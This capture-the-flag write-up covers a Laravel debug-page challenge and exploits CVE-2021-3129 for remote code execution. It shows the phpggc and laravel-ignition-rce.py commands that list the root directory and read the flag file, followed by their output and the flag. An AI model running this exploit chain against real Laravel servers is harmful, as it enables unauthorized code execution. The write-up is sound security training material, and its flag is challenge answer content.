# DaaS
## Description
We suspect this server holds valuable information that would further benefit our cause, but we've hit a dead end with this debug page running on a known framework called Laravel. Surely we couldn't exploit this further.. right?

## Methodology
This challenge wasn't provided with a source code but from the description we can take a hint that we are dealing with a `debug` page and `laravel` framework. The website also provides the `laravel` version.

`Laravel v8.35.1 (PHP v7.4.16) `

This version is vulnerable to `CVE-2021-3129` (`RCE`). Exploit for this vuln is provided in [laravel-exploit](https://github.com/ambionics/laravel-exploits).

## Exploit
We are going to list files in `/` directory

```sh
php -d'phar.readonly=0' ~/Documents/tools/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "ls /"
laravel-exploits/laravel-ignition-rce.py http://138.68.148.149:31636/ /tmp/exploit.phar
```

```
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
bin
boot
dev
entrypoint.sh
etc
flagmfBBE
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
--------------------------
+ Logs cleared
```

There is a flag

```sh
php -d'phar.readonly=0' ~/Documents/tools/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagmfBBE"
laravel-exploits/laravel-ignition-rce.py http://138.68.148.149:31636/ /tmp/exploit.phar
```

```
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
--------------------------
+ Logs cleared
```

## Flag
**CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}**